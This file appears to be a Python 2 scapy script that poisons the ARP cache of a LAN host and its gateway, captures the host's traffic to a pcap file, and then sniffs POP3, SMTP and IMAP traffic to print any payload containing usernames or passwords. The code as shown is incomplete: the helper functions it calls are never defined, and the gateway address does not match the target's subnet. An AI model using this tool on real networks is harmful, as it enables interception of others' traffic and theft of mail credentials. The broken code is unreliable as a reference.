from scapy.all import *
import os
import sys
import threading
import signal

interface =     "en1"
target_ip =     "192.168.0.27"
gateway_ip =    "182.168.0.1"
packet_count =  1000


#defining our interface
conf.iface = interface

#disable output
conf.verb = 0

print"[*] Setting up %s" % interface

gateway_mac = get_mac(gateway_ip)

if gateway_mac is None:
    print"[!] FUCK! Failed to get gateway MAC... Aborting..."
    sys.exit(0)
else:
    print"[*] Gateway %s is at %s" %(gateway_ip, gateway_mac)

target_mac = get_mac(target_ip)
if target_mac is None:
    print"[!] FUCK! Failed to get target MAC... Aborting..."
    sys.exit(0)
else:
    print"[*] Target %s is at %s" %(target_ip, target_mac)

#Let's poisoning...
poison_thread = threading.Thread(target = poison_target,args=(gateway_ip,gateway_mac,target_ip,target_mac))
poison_thread.start()

try:
    print"[*] Starting sniffer for %d packets" % packet_count

    bpf_filter = "ip hosts %s" % target_ip
    packets = sniff(count=packet_count, filter=bpf_filter, iface=interface)

    #write the captured packets
    wrpcap('arper.pcap', packets)

    #restore network
    restore_target(gateway_ip, gateway_mac,target_ip, target_mac)

except KeyboardInterrupt:
    #restore network
    restore_target(gateway_ip, gateway_mac,target_ip, target_mac)
    sys.exit(0)


#callback for all the packages that match the filter
def packet_callback(packet):
    if packet[TCP].payload:
        mail_packet = str(packet[TCP].payload)
        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
            print"[*] SERVER: %s " % packet[IP].dst
            print"[*] %s " % packet[TCP].payload
    

#trigger the sniffer
sniff(filter="tcp port 110 or tcp port 25 or tcp port 143",prn=packet_callback,store=0)
